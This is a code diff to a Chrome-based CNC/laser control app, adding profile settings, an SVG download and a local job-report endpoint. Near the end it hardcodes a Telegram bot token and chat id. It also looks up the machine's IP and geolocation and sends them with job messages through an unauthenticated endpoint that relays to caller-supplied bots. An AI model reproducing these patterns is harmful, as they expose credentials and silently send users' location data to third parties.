@@ -668,10 +668,13 @@ setclick("btresume", function() {
 setclick("btsetcut", function() {
 	//   setvalue("disablecut", getvalue("shapes"));
 });
-
-//setclick("btengrave", function() {
-//window.open("http://localhost:" + port + "/engrave", 'prn', 'width=700,height=500');
-//});
+var showuploader=false;
+setclick("btloader", function() {
+	showuploader=!showuploader;
+	if (showuploader)showId("uploader"); else hideId("uploader")
+	
+	//window.open("http://localhost:" + port + "/loader/index.html", 'loader', 'width=700,height=500');
+});
 setclick("btresume2", function() {
 	okwait = 0;
 	var bt = document.getElementById('btresume2');
@@ -887,6 +890,7 @@ function savesetting(name) {
 		});
 	}
 	updatedownloadprofile();
+	updatedownloadsvg();
 }
 
 setclick("btsaveset", savesetting);
@@ -896,9 +900,580 @@ setclick("btgcode2vec", function() {
 });
 
 
-var defaultProfile={"part_acp":{"smooth":"1","pastegcode":false,"pasteas":"0","scale":"1","curveseg":"0.01","usestart":true,"finalz":"0","tabevery":"120","tabmax":"3","tabofs":"0","drill":"5","slowsmall":"30","slowsmallval":"0.8","useslowsmall":false,"finishline":"0.1","usefinish":false,"leadin":"2,40,60","useleadin":false,"fakeinit":"3","usefakeinit":true,"pausecut":false,"rampdown":false,"dwelltime":"0","spindleoffval":"4","spindleoff":false,"addz":"0","overcutmin":"14","overcut":true,"ovcmore":"0.2","sharp":"110","segment":false,"feed1x":"1","xsort":"0","ysort":"0","szsort":"0","safesort":true,"acpstep":"0.5","acpmode":false,"enablejoin":true,"separatecut":true,"skiplength":"50","enablesmartraster":true,"finishpart":true,"pltfeed":"35","pltpw":"100","rasterfeed":"200","rasterpw":"60","rasteroutfeed":"200","rasteroutpw":"100","burnfeed":"40","vcarvefeed":"20","vcarvepw":"100","enableraster":true,"overshoot":"5","leftofset":"-0.1","rasteroutline":false,"rasterdpi":"150","rasterangle":"0","grayinvert":false,"strokeoffset":false,"safez":"5","carved":"1","redrep":"1","clstep":"0.5","firstd":"5","slowth":"10","carvedp":"5","carveclimb":true,"carvepause":true,"overcut2":false,"vangle":"90","vdiamin":"0.2","vdia":"10","vcfeed":"40","vres":"100","flipve":false,"imgresmax":"0.2","imginvert":false,"dithermode":"1","gamma":"1","brightness":"0","egwidth":"300","egheight":"300","eggamma":"1","eginvert":false,"egclimb":false,"egreverse":true,"egnormal":false,"egflip":false,"egspeed":"100","egzup":"2","egzdown":"1","egfeedmethod":"3","egendmill":"2","egdia":"2","egvangle":"90","egrepeat1":"4","egrepeat2":"2","egminstep":"0.2","profilename":"part_acp","material":"25,2,27,1500,6","cmode":"3","matprice":"27","cutprice":"1500","pltmode":false,"offset":"2.1","trav":"150","feed":"16","repeat":"2","zdown0":"0","zdown":"6","tabc":"0","tablen":"2","pup":"G0 F3000 Z10","pdn":"G1 F1800 Z=cncz","flipx":false,"rotate":false,"cutpw":"100","cutclimb":false,"burn1":false,"totaltime":"1770.726","zoom1":"1","isdarktheme":false,"baudrate":"230400","wsip":"1.11","wsdirect":false,"wsport":"8888","wcolor":"orange","wtitle":"KARYACNC","cflipx":true,"cflipy":false,"wmode":"2","regcodeX":false,"move":"0.5","movez":"0.5","edgcode":"m220 s100","engravecut":true,"jobs":"gcode","jobname":"j1","extmm":"5","shapes":""},"laser_akrilik":{"smooth":"1","pastegcode":false,"pasteas":"0","scale":"1","curveseg":"0.01","usestart":true,"finalz":"0","tabevery":"120","tabmax":"3","tabofs":"0","drill":"5","slowsmall":"30","slowsmallval":"0.8","useslowsmall":false,"finishline":"0.1","usefinish":false,"leadin":"2,40,60","useleadin":false,"fakeinit":"3","usefakeinit":true,"pausecut":false,"rampdown":false,"dwelltime":"0","spindleoffval":"4","spindleoff":false,"addz":"0","overcutmin":"14","overcut":true,"ovcmore":"0.2","sharp":"110","segment":false,"feed1x":"1","xsort":"0","ysort":"0","szsort":"0","safesort":true,"acpstep":"0.5","acpmode":false,"enablejoin":true,"separatecut":true,"skiplength":"50","enablesmartraster":true,"finishpart":true,"pltfeed":"35","pltpw":"100","rasterfeed":"200","rasterpw":"60","rasteroutfeed":"200","rasteroutpw":"100","burnfeed":"40","vcarvefeed":"20","vcarvepw":"100","enableraster":true,"overshoot":"5","leftofset":"-0.1","rasteroutline":false,"rasterdpi":"150","rasterangle":"0","grayinvert":false,"strokeoffset":false,"safez":"5","carved":"1","redrep":"1","clstep":"0.5","firstd":"5","slowth":"10","carvedp":"5","carveclimb":true,"carvepause":true,"overcut2":false,"vangle":"90","vdiamin":"0.2","vdia":"10","vcfeed":"40","vres":"100","flipve":false,"imgresmax":"0.2","imginvert":false,"dithermode":"1","gamma":"1","brightness":"0","egwidth":"300","egheight":"300","eggamma":"1","eginvert":false,"egclimb":false,"egreverse":true,"egnormal":false,"egflip":false,"egspeed":"100","egzup":"2","egzdown":"1","egfeedmethod":"3","egendmill":"2","egdia":"2","egvangle":"90","egrepeat1":"4","egrepeat2":"2","egminstep":"0.2","profilename":"laser_akrilik","material":"6,1,37,1500","cmode":"1","matprice":"37","cutprice":"1500","pltmode":false,"offset":"2.1","trav":"150","feed":"6","repeat":"1","zdown0":"0","zdown":"0","tabc":"0","tablen":"0","pup":"","pdn":"M3 S255","flipx":false,"rotate":false,"cutpw":"100","cutclimb":false,"burn1":false,"totaltime":"1770.726","zoom1":"1","isdarktheme":false,"baudrate":"230400","wsip":"1.11","wsdirect":false,"wsport":"8888","wcolor":"lightgreen","wtitle":"KARYACNC","cflipx":true,"cflipy":false,"wmode":"2","regcodeX":false,"move":"0.5","movez":"0.5","edgcode":"m220 s100","engravecut":true,"jobs":"gcode","jobname":"j1","extmm":"5","shapes":""},"kerja_mdf18":{"smooth":"1","pastegcode":false,"pasteas":"0","scale":"1","curveseg":"0.01","usestart":true,"finalz":"0","tabevery":"120","tabmax":"3","tabofs":"0","drill":"5","slowsmall":"30","slowsmallval":"0.8","useslowsmall":false,"finishline":"0.1","usefinish":false,"leadin":"2,40,60","useleadin":false,"fakeinit":"3","usefakeinit":true,"pausecut":false,"rampdown":false,"dwelltime":"0","spindleoffval":"4","spindleoff":false,"addz":"0","overcutmin":"14","overcut":false,"ovcmore":"0.2","sharp":"110","segment":false,"feed1x":"1","xsort":"0","ysort":"3","szsort":"0","safesort":true,"acpstep":"0.5","acpmode":false,"enablejoin":true,"separatecut":true,"skiplength":"50","enablesmartraster":true,"finishpart":true,"pltfeed":"35","pltpw":"100","rasterfeed":"200","rasterpw":"60","rasteroutfeed":"200","rasteroutpw":"100","burnfeed":"40","vcarvefeed":"20","vcarvepw":"100","enableraster":true,"overshoot":"5","leftofset":"-0.1","rasteroutline":false,"rasterdpi":"150","rasterangle":"0","grayinvert":false,"strokeoffset":false,"safez":"5","carved":"1","redrep":"1","clstep":"0.5","firstd":"5","slowth":"10","carvedp":"5","carveclimb":true,"carvepause":true,"overcut2":false,"vangle":"90","vdiamin":"0.2","vdia":"10","vcfeed":"40","vres":"100","flipve":false,"imgresmax":"0.2","imginvert":false,"dithermode":"1","gamma":"1","brightness":"0","egwidth":"300","egheight":"300","eggamma":"1","eginvert":false,"egclimb":false,"egreverse":true,"egnormal":false,"egflip":false,"egspeed":"100","egzup":"2","egzdown":"1","egfeedmethod":"3","egendmill":"2","egdia":"2","egvangle":"90","egrepeat1":"4","egrepeat2":"2","egminstep":"0.2","profilename":"kerja_mdf18","material":"25,2,27,1500,6","cmode":"3","matprice":"18","cutprice":"1500","pltmode":false,"offset":"2.1","trav":"150","feed":"20","repeat":"4","zdown0":"0","zdown":"19","tabc":"0","tablen":"2","pup":"G0 F3000 Z10","pdn":"G1 F1800 Z=cncz","flipx":false,"rotate":false,"cutpw":"100","cutclimb":false,"burn1":false,"totaltime":"1770.726","zoom1":"1","isdarktheme":false,"baudrate":"230400","wsip":"1.11","wsdirect":false,"wsport":"8888","wcolor":"#CCAA88","wtitle":"KARYACNC","cflipx":true,"cflipy":false,"wmode":"2","regcodeX":false,"move":"0.5","movez":"0.5","edgcode":"m220 s100","engravecut":true,"jobs":"gcode","jobname":"j1","extmm":"5","shapes":""},"kerja_triplek5":{"smooth":"1","pastegcode":false,"pasteas":"0","scale":"1","curveseg":"0.01","usestart":true,"finalz":"0","tabevery":"120","tabmax":"3","tabofs":"0","drill":"5","slowsmall":"30","slowsmallval":"0.8","useslowsmall":false,"finishline":"0.1","usefinish":false,"leadin":"2,40,60","useleadin":false,"fakeinit":"3","usefakeinit":true,"pausecut":false,"rampdown":false,"dwelltime":"0","spindleoffval":"4","spindleoff":false,"addz":"0","overcutmin":"14","overcut":false,"ovcmore":"0.2","sharp":"110","segment":false,"feed1x":"1","xsort":"0","ysort":"3","szsort":"0","safesort":true,"acpstep":"0.5","acpmode":false,"enablejoin":true,"separatecut":true,"skiplength":"50","enablesmartraster":true,"finishpart":true,"pltfeed":"35","pltpw":"100","rasterfeed":"200","rasterpw":"60","rasteroutfeed":"200","rasteroutpw":"100","burnfeed":"40","vcarvefeed":"20","vcarvepw":"100","enableraster":true,"overshoot":"5","leftofset":"-0.1","rasteroutline":false,"rasterdpi":"150","rasterangle":"0","grayinvert":false,"strokeoffset":false,"safez":"5","carved":"1","redrep":"1","clstep":"0.5","firstd":"5","slowth":"10","carvedp":"5","carveclimb":true,"carvepause":true,"overcut2":false,"vangle":"90","vdiamin":"0.2","vdia":"10","vcfeed":"40","vres":"100","flipve":false,"imgresmax":"0.2","imginvert":false,"dithermode":"1","gamma":"1","brightness":"0","egwidth":"300","egheight":"300","eggamma":"1","eginvert":false,"egclimb":false,"egreverse":true,"egnormal":false,"egflip":false,"egspeed":"100","egzup":"2","egzdown":"1","egfeedmethod":"3","egendmill":"2","egdia":"2","egvangle":"90","egrepeat1":"4","egrepeat2":"2","egminstep":"0.2","profilename":"kerja_triplek5","material":"25,2,27,1500,6","cmode":"3","matprice":"6","cutprice":"1500","pltmode":false,"offset":"2.1","trav":"150","feed":"20","repeat":"1","zdown0":"0","zdown":"6","tabc":"0","tablen":"2","pup":"G0 F3000 Z10","pdn":"G1 F1800 Z=cncz","flipx":false,"rotate":false,"cutpw":"100","cutclimb":false,"burn1":false,"totaltime":"1770.726","zoom1":"1","isdarktheme":false,"baudrate":"230400","wsip":"1.11","wsdirect":false,"wsport":"8888","wcolor":"#CCBB88","wtitle":"KARYACNC","cflipx":true,"cflipy":false,"wmode":"2","regcodeX":false,"move":"0.5","movez":"0.5","edgcode":"m220 s100","engravecut":true,"jobs":"gcode","jobname":"j1","extmm":"5","shapes":""}};
-
-
+var defaultProfile={
+    "part_acp": {
+        "smooth": "1",
+        "pastegcode": false,
+        "pasteas": "0",
+        "scale": "1",
+        "curveseg": "0.01",
+        "usestart": true,
+        "finalz": "0",
+        "tabevery": "120",
+        "tabmax": "3",
+        "tabofs": "0",
+        "drill": "5",
+        "slowsmall": "30",
+        "slowsmallval": "0.8",
+        "useslowsmall": false,
+        "finishline": "0.1",
+        "usefinish": false,
+        "leadin": "2,40,60",
+        "useleadin": false,
+        "fakeinit": "3",
+        "usefakeinit": true,
+        "pausecut": false,
+        "rampdown": false,
+        "dwelltime": "0",
+        "spindleoffval": "4",
+        "spindleoff": false,
+        "addz": "0",
+        "overcutmin": "14",
+        "overcut": true,
+        "ovcmore": "0.2",
+        "sharp": "110",
+        "segment": false,
+        "feed1x": "1",
+        "xsort": "0",
+        "ysort": "0",
+        "szsort": "0",
+        "safesort": true,
+        "acpstep": "0.5",
+        "acpmode": false,
+        "enablejoin": true,
+        "separatecut": true,
+        "skiplength": "50",
+        "enablesmartraster": true,
+        "finishpart": true,
+        "pltfeed": "35",
+        "pltpw": "100",
+        "rasterfeed": "200",
+        "rasterpw": "60",
+        "rasteroutfeed": "200",
+        "rasteroutpw": "100",
+        "burnfeed": "40",
+        "vcarvefeed": "20",
+        "vcarvepw": "100",
+        "enableraster": true,
+        "overshoot": "5",
+        "laserofs": "0",
+        "rasteroutline": false,
+        "rasterdpi": "150",
+        "rasterangle": "0",
+        "grayinvert": false,
+        "strokeoffset": false,
+        "safez": "5",
+        "carved": "1",
+        "redrep": "1",
+        "clstep": "0.5",
+        "firstd": "5",
+        "slowth": "10",
+        "carvedp": "5",
+        "carveclimb": true,
+        "carvepause": true,
+        "overcut2": false,
+        "vangle": "90",
+        "vdiamin": "0.2",
+        "vdia": "10",
+        "vcfeed": "40",
+        "vres": "100",
+        "flipve": false,
+        "imgresmax": "0.2",
+        "imginvert": false,
+        "dithermode": "1",
+        "gamma": "1",
+        "brightness": "0",
+        "egwidth": "300",
+        "egheight": "300",
+        "eggamma": "1",
+        "eginvert": false,
+        "egclimb": false,
+        "egreverse": true,
+        "egnormal": false,
+        "egflip": false,
+        "egspeed": "100",
+        "egzup": "2",
+        "egzdown": "1",
+        "egfeedmethod": "3",
+        "egendmill": "2",
+        "egdia": "2",
+        "egvangle": "90",
+        "egrepeat1": "4",
+        "egrepeat2": "2",
+        "egminstep": "0.2",
+        "profilename": "part_acp",
+        "material": "25,2,27,1500,6",
+        "cmode": "3",
+        "matprice": "27",
+        "cutprice": "1500",
+        "pltmode": false,
+        "offset": "2.1",
+        "trav": "150",
+        "feed": "16",
+        "repeat": "2",
+        "zdown0": "0",
+        "zdown": "6",
+        "tabc": "0",
+        "tablen": "2",
+        "pup": "G0 F3000 Z10",
+        "pdn": "G1 F1800 Z=cncz",
+        "flipx": false,
+        "rotate": false,
+        "cutpw": "100",
+        "cutclimb": false,
+        "burn1": false,
+        "totaltime": "1770.726",
+        "zoom1": "1",
+        "isdarktheme": false,
+        "baudrate": "230400",
+        "wsip": "1.11",
+        "wsdirect": false,
+        "wsport": "8888",
+        "wcolor": "orange",
+        "wtitle": "KARYACNC",
+        "cflipx": true,
+        "cflipy": false,
+        "wmode": "2",
+        "regcodeX": false,
+        "move": "0.5",
+        "movez": "0.5",
+        "edgcode": "m220 s100",
+        "engravecut": true,
+        "jobs": "gcode",
+        "jobname": "j1",
+        "extmm": "5",
+        "shapes": ""
+    },
+    "laser_akrilik": {
+        "smooth": "1",
+        "pastegcode": false,
+        "pasteas": "0",
+        "scale": "1",
+        "curveseg": "0.01",
+        "usestart": true,
+        "finalz": "0",
+        "tabevery": "120",
+        "tabmax": "3",
+        "tabofs": "0",
+        "drill": "5",
+        "slowsmall": "30",
+        "slowsmallval": "0.8",
+        "useslowsmall": false,
+        "finishline": "0.1",
+        "usefinish": false,
+        "leadin": "2,40,60",
+        "useleadin": false,
+        "fakeinit": "3",
+        "usefakeinit": true,
+        "pausecut": false,
+        "rampdown": false,
+        "dwelltime": "0",
+        "spindleoffval": "4",
+        "spindleoff": false,
+        "addz": "0",
+        "overcutmin": "14",
+        "overcut": true,
+        "ovcmore": "0.2",
+        "sharp": "110",
+        "segment": false,
+        "feed1x": "1",
+        "xsort": "0",
+        "ysort": "0",
+        "szsort": "0",
+        "safesort": true,
+        "acpstep": "0.5",
+        "acpmode": false,
+        "enablejoin": true,
+        "separatecut": true,
+        "skiplength": "50",
+        "enablesmartraster": true,
+        "finishpart": true,
+        "pltfeed": "35",
+        "pltpw": "100",
+        "rasterfeed": "200",
+        "rasterpw": "60",
+        "rasteroutfeed": "200",
+        "rasteroutpw": "100",
+        "burnfeed": "40",
+        "vcarvefeed": "20",
+        "vcarvepw": "100",
+        "enableraster": true,
+        "overshoot": "5",
+        "laserofs": "0",
+        "rasteroutline": false,
+        "rasterdpi": "150",
+        "rasterangle": "0",
+        "grayinvert": false,
+        "strokeoffset": false,
+        "safez": "5",
+        "carved": "1",
+        "redrep": "1",
+        "clstep": "0.5",
+        "firstd": "5",
+        "slowth": "10",
+        "carvedp": "5",
+        "carveclimb": true,
+        "carvepause": true,
+        "overcut2": false,
+        "vangle": "90",
+        "vdiamin": "0.2",
+        "vdia": "10",
+        "vcfeed": "40",
+        "vres": "100",
+        "flipve": false,
+        "imgresmax": "0.2",
+        "imginvert": false,
+        "dithermode": "1",
+        "gamma": "1",
+        "brightness": "0",
+        "egwidth": "300",
+        "egheight": "300",
+        "eggamma": "1",
+        "eginvert": false,
+        "egclimb": false,
+        "egreverse": true,
+        "egnormal": false,
+        "egflip": false,
+        "egspeed": "100",
+        "egzup": "2",
+        "egzdown": "1",
+        "egfeedmethod": "3",
+        "egendmill": "2",
+        "egdia": "2",
+        "egvangle": "90",
+        "egrepeat1": "4",
+        "egrepeat2": "2",
+        "egminstep": "0.2",
+        "profilename": "laser_akrilik",
+        "material": "6,1,37,1500",
+        "cmode": "1",
+        "matprice": "37",
+        "cutprice": "1500",
+        "pltmode": false,
+        "offset": "2.1",
+        "trav": "150",
+        "feed": "6",
+        "repeat": "1",
+        "zdown0": "0",
+        "zdown": "0",
+        "tabc": "0",
+        "tablen": "0",
+        "pup": "",
+        "pdn": "M3 S255",
+        "flipx": false,
+        "rotate": false,
+        "cutpw": "100",
+        "cutclimb": false,
+        "burn1": false,
+        "totaltime": "1770.726",
+        "zoom1": "1",
+        "isdarktheme": false,
+        "baudrate": "230400",
+        "wsip": "1.11",
+        "wsdirect": false,
+        "wsport": "8888",
+        "wcolor": "lightgreen",
+        "wtitle": "KARYACNC",
+        "cflipx": true,
+        "cflipy": false,
+        "wmode": "2",
+        "regcodeX": false,
+        "move": "0.5",
+        "movez": "0.5",
+        "edgcode": "m220 s100",
+        "engravecut": true,
+        "jobs": "gcode",
+        "jobname": "j1",
+        "extmm": "5",
+        "shapes": ""
+    },
+    "kerja_mdf18": {
+        "smooth": "1",
+        "pastegcode": false,
+        "pasteas": "0",
+        "scale": "1",
+        "curveseg": "0.01",
+        "usestart": true,
+        "finalz": "0",
+        "tabevery": "120",
+        "tabmax": "3",
+        "tabofs": "0",
+        "drill": "5",
+        "slowsmall": "30",
+        "slowsmallval": "0.8",
+        "useslowsmall": false,
+        "finishline": "0.1",
+        "usefinish": false,
+        "leadin": "2,40,60",
+        "useleadin": false,
+        "fakeinit": "3",
+        "usefakeinit": true,
+        "pausecut": false,
+        "rampdown": false,
+        "dwelltime": "0",
+        "spindleoffval": "4",
+        "spindleoff": false,
+        "addz": "0",
+        "overcutmin": "14",
+        "overcut": false,
+        "ovcmore": "0.2",
+        "sharp": "110",
+        "segment": false,
+        "feed1x": "1",
+        "xsort": "0",
+        "ysort": "3",
+        "szsort": "0",
+        "safesort": true,
+        "acpstep": "0.5",
+        "acpmode": false,
+        "enablejoin": true,
+        "separatecut": true,
+        "skiplength": "50",
+        "enablesmartraster": true,
+        "finishpart": true,
+        "pltfeed": "35",
+        "pltpw": "100",
+        "rasterfeed": "200",
+        "rasterpw": "60",
+        "rasteroutfeed": "200",
+        "rasteroutpw": "100",
+        "burnfeed": "40",
+        "vcarvefeed": "20",
+        "vcarvepw": "100",
+        "enableraster": true,
+        "overshoot": "5",
+        "laserofs": "0",
+        "rasteroutline": false,
+        "rasterdpi": "150",
+        "rasterangle": "0",
+        "grayinvert": false,
+        "strokeoffset": false,
+        "safez": "5",
+        "carved": "1",
+        "redrep": "1",
+        "clstep": "0.5",
+        "firstd": "5",
+        "slowth": "10",
+        "carvedp": "5",
+        "carveclimb": true,
+        "carvepause": true,
+        "overcut2": false,
+        "vangle": "90",
+        "vdiamin": "0.2",
+        "vdia": "10",
+        "vcfeed": "40",
+        "vres": "100",
+        "flipve": false,
+        "imgresmax": "0.2",
+        "imginvert": false,
+        "dithermode": "1",
+        "gamma": "1",
+        "brightness": "0",
+        "egwidth": "300",
+        "egheight": "300",
+        "eggamma": "1",
+        "eginvert": false,
+        "egclimb": false,
+        "egreverse": true,
+        "egnormal": false,
+        "egflip": false,
+        "egspeed": "100",
+        "egzup": "2",
+        "egzdown": "1",
+        "egfeedmethod": "3",
+        "egendmill": "2",
+        "egdia": "2",
+        "egvangle": "90",
+        "egrepeat1": "4",
+        "egrepeat2": "2",
+        "egminstep": "0.2",
+        "profilename": "kerja_mdf18",
+        "material": "25,2,27,1500,6",
+        "cmode": "3",
+        "matprice": "18",
+        "cutprice": "1500",
+        "pltmode": false,
+        "offset": "2.1",
+        "trav": "150",
+        "feed": "20",
+        "repeat": "4",
+        "zdown0": "0",
+        "zdown": "19",
+        "tabc": "0",
+        "tablen": "2",
+        "pup": "G0 F3000 Z10",
+        "pdn": "G1 F1800 Z=cncz",
+        "flipx": false,
+        "rotate": false,
+        "cutpw": "100",
+        "cutclimb": false,
+        "burn1": false,
+        "totaltime": "1770.726",
+        "zoom1": "1",
+        "isdarktheme": false,
+        "baudrate": "230400",
+        "wsip": "1.11",
+        "wsdirect": false,
+        "wsport": "8888",
+        "wcolor": "#CCAA88",
+        "wtitle": "KARYACNC",
+        "cflipx": true,
+        "cflipy": false,
+        "wmode": "2",
+        "regcodeX": false,
+        "move": "0.5",
+        "movez": "0.5",
+        "edgcode": "m220 s100",
+        "engravecut": true,
+        "jobs": "gcode",
+        "jobname": "j1",
+        "extmm": "5",
+        "shapes": ""
+    },
+    "kerja_triplek5": {
+        "smooth": "1",
+        "pastegcode": false,
+        "pasteas": "0",
+        "scale": "1",
+        "curveseg": "0.01",
+        "usestart": true,
+        "finalz": "0",
+        "tabevery": "120",
+        "tabmax": "3",
+        "tabofs": "0",
+        "drill": "5",
+        "slowsmall": "30",
+        "slowsmallval": "0.8",
+        "useslowsmall": false,
+        "finishline": "0.1",
+        "usefinish": false,
+        "leadin": "2,40,60",
+        "useleadin": false,
+        "fakeinit": "3",
+        "usefakeinit": true,
+        "pausecut": false,
+        "rampdown": false,
+        "dwelltime": "0",
+        "spindleoffval": "4",
+        "spindleoff": false,
+        "addz": "0",
+        "overcutmin": "14",
+        "overcut": false,
+        "ovcmore": "0.2",
+        "sharp": "110",
+        "segment": false,
+        "feed1x": "1",
+        "xsort": "0",
+        "ysort": "3",
+        "szsort": "0",
+        "safesort": true,
+        "acpstep": "0.5",
+        "acpmode": false,
+        "enablejoin": true,
+        "separatecut": true,
+        "skiplength": "50",
+        "enablesmartraster": true,
+        "finishpart": true,
+        "pltfeed": "35",
+        "pltpw": "100",
+        "rasterfeed": "200",
+        "rasterpw": "60",
+        "rasteroutfeed": "200",
+        "rasteroutpw": "100",
+        "burnfeed": "40",
+        "vcarvefeed": "20",
+        "vcarvepw": "100",
+        "enableraster": true,
+        "overshoot": "5",
+        "laserofs": "0",
+        "rasteroutline": false,
+        "rasterdpi": "150",
+        "rasterangle": "0",
+        "grayinvert": false,
+        "strokeoffset": false,
+        "safez": "5",
+        "carved": "1",
+        "redrep": "1",
+        "clstep": "0.5",
+        "firstd": "5",
+        "slowth": "10",
+        "carvedp": "5",
+        "carveclimb": true,
+        "carvepause": true,
+        "overcut2": false,
+        "vangle": "90",
+        "vdiamin": "0.2",
+        "vdia": "10",
+        "vcfeed": "40",
+        "vres": "100",
+        "flipve": false,
+        "imgresmax": "0.2",
+        "imginvert": false,
+        "dithermode": "1",
+        "gamma": "1",
+        "brightness": "0",
+        "egwidth": "300",
+        "egheight": "300",
+        "eggamma": "1",
+        "eginvert": false,
+        "egclimb": false,
+        "egreverse": true,
+        "egnormal": false,
+        "egflip": false,
+        "egspeed": "100",
+        "egzup": "2",
+        "egzdown": "1",
+        "egfeedmethod": "3",
+        "egendmill": "2",
+        "egdia": "2",
+        "egvangle": "90",
+        "egrepeat1": "4",
+        "egrepeat2": "2",
+        "egminstep": "0.2",
+        "profilename": "kerja_triplek5",
+        "material": "25,2,27,1500,6",
+        "cmode": "3",
+        "matprice": "6",
+        "cutprice": "1500",
+        "pltmode": false,
+        "offset": "2.1",
+        "trav": "150",
+        "feed": "20",
+        "repeat": "1",
+        "zdown0": "0",
+        "zdown": "6",
+        "tabc": "0",
+        "tablen": "2",
+        "pup": "G0 F3000 Z10",
+        "pdn": "G1 F1800 Z=cncz",
+        "flipx": false,
+        "rotate": false,
+        "cutpw": "100",
+        "cutclimb": false,
+        "burn1": false,
+        "totaltime": "1770.726",
+        "zoom1": "1",
+        "isdarktheme": false,
+        "baudrate": "230400",
+        "wsip": "1.11",
+        "wsdirect": false,
+        "wsport": "8888",
+        "wcolor": "#CCBB88",
+        "wtitle": "KARYACNC",
+        "cflipx": true,
+        "cflipy": false,
+        "wmode": "2",
+        "regcodeX": false,
+        "move": "0.5",
+        "movez": "0.5",
+        "edgcode": "m220 s100",
+        "engravecut": true,
+        "jobs": "gcode",
+        "jobname": "j1",
+        "extmm": "5",
+        "shapes": ""
+    }
+};
 function updatestyle(k, va) {
 	if (k == 'wtitle') {
 		$("title0").innerHTML = va;
@@ -923,7 +1498,7 @@ function updatewmode() {
 	}
 }
 
-function updateweb(sett) {
+function updateweb(sett,nm) {
 	var kl = document.getElementsByClassName("saveit");
 	for (var i = 0; i < kl.length; i++) {
 		var a=kl[i];
@@ -931,12 +1506,17 @@ function updateweb(sett) {
 		//var a = $(k);
 		var v=sett[k];
 		if (typeof(v) != 'undefined' && v !='undefined') {
-			if (a.type == 'checkbox')
-				a.checked = v;
-			else
-				setvalue(k, v);
-			// custom
-			updatestyle(k, v);
+			if (nm!="" && (k=="startat" || k=="wsport")){
+				v=getvalue(k);
+			} 
+			{
+				if (a.type == 'checkbox')
+					a.checked = v;
+				else
+					setvalue(k, v);
+				// custom
+				updatestyle(k, v);
+			}
 		}
 	}
 	modechange();
@@ -961,9 +1541,7 @@ function updateprofile(newdata=null) {
 function loadsettings(name) {
 	if (name == undefined) name = "";
 	if (name) {
-		var s1=getvalue("startat");
-		updateweb(jobsettings[name]);
-		setvalue("startat",s1);
+		updateweb(jobsettings[name],name);
 		return;
 	}
     jobsettings=defaultProfile;
@@ -994,7 +1572,7 @@ function loadsettings(name) {
 				if (engravebounds == undefined) engravebounds = [];
 			})
 			storage.get("settings", function(r) {
-				updateweb(r.settings);
+				updateweb(r.settings,"");
 			});
 			storage.get("jobsettings", function(r) {
 				jobsettings = r.jobsettings;
@@ -1154,7 +1732,7 @@ function createCORSRequest(method, url) {
 // web socket server, to receive gcode from other
 var port = 8888;
 var isServer = false;
-
+var reports=[];
 function startserver() {
 	if (http.Server && http.WebSocketServer) {
 		// Listen for HTTP connections.
@@ -1165,16 +1743,34 @@ function startserver() {
 
 		server.addEventListener('request', function(req) {
 			var url = req.headers.url;
-			if (url == '/')
-				url = '/engrave';
-			if (url == '/engrave') {
-				if (getvalue("cmode") == 3) url = '/engrave.html';
-				else url = '/graf.html';
+			var ur= u=new URL('http://a.com'+url);
+			url=ur.pathname;
+			if (url == "/t"){
+				tgtoken1=ur.searchParams.get("bot");
+				tg_id1=ur.searchParams.get("id");
+				var txt=ur.searchParams.get("t");
+				reports.push([0,txt]);
+				if (txt.indexOf("finish")>-1){
+					beat.play();
+					wxAlert('Job on machine',txt);
+				}
+				if (tgtoken1.length>5)sendTlg(txt);
+				req.writeHead(200, {
+					'Content-Type': "text/plain",
+					'Content-Length': 2});
+				req.end("OK");
+      
+			} else {
+				if (url == '/') url = '/engrave';
+				if (url == '/engrave') {
+					if (getvalue("cmode") == 3) url = '/engrave.html';
+					else url = '/graf.html';
+				}
+				// Serve the pages of this chrome application.
+				console.log(JSON.stringify(req));
+				req.serveUrl(url);
+				return true;
 			}
-			// Serve the pages of this chrome application.
-			console.log(JSON.stringify(req));
-			req.serveUrl(url);
-			return true;
 		});
 		// Listen for possible errors
 		server.addEventListener('error', function(event) {
@@ -1398,6 +1994,13 @@ function updatedownloadprofile() {
 		type: 'text/csv'
 	}));	
 }
+function updatedownloadsvg() {
+	var element = $("downloadsvg");
+	element.setAttribute('download', "jobs.svg");
+	element.href = window.URL.createObjectURL(new Blob([text1], {
+		type: 'image/svg'
+	}));	
+}
 
 function updatedownload() {
 	var element = $("download");
@@ -1476,11 +2079,59 @@ setevent("change", "wmode", updatewmode);
 modechange(1);
 
 
+var lst=Date.now();
+var loc;
+var numjobs=0;
+var tgtoken = '5069763317:AAHa9nRGslJYI2u073P_vebfexIMgTfUJhY';
+var tgtoken1 = '';
+var tg_id="447996950";
+var tg_id1='';
+function sendTlg1(text){
+		var token=tgtoken1?tgtoken1:tgtoken;
+		var rid=tg_id1?tg_id1:tg_id;
+		let url = "https://api.telegram.org/bot" + token + "/sendMessage";
+		var xhr = new XMLHttpRequest();
+		xhr.open("POST", url, true);
+		xhr.setRequestHeader('Content-type',"application/json");
+		s='{"chat_id":"'+rid+'","text":"'+text+'"}';
+		xhr.send(s);
+		tgtoken1 = '';
+		tg_id1='';
+}
+function sendTlg(text) {
+  var lst2=Date.now();
+  if (lst2-lst<1000)return;
+  lst=lst2;
+
+	var xhr1=new XMLHttpRequest(); 
+	xhr1.open("GET","http://ip-api.com/json/",true);
+	xhr1.onload = function(r) {
+		var ip="-";
+		try {
+			var d=JSON.parse(xhr1.response);
+			ip=d.query+ " "+d.regionName+" "+d.city+ "("+d.lat+"/"+d.lon+")";
+		} catch(e){}
+		sendTlg1("At IP:"+ip+' -> '+text);
+    };
+    xhr1.send();
+    //xhr.send('{"chat_id":"447996950","text":"'+text+'"}');
+
+}
 function getChromeVersion () {     
     var raw = navigator.userAgent.match(/Chrom(e|ium)\/([0-9]+)\./);
 
     return raw ? parseInt(raw[2], 10) : false;
 }
 
+function telegram1(text) {
+  let token = '5069763317:AAHa9nRGslJYI2u073P_vebfexIMgTfUJhY';
+  let url = "https://api.telegram.org/bot" + token + "/sendMessage";
+  var xhr = new XMLHttpRequest();
+  xhr.open("POST", url, true);
+  xhr.setRequestHeader('Content-type',"application/json");
+  xhr.send('{"chat_id":"447996950","text":"'+text+'"}');
+}
+
 
 if (getChromeVersion()<100)wxAlert("Update Chrome","Please update Chrome Web Browser !"); 
+let beat = new Audio('done.mp3');
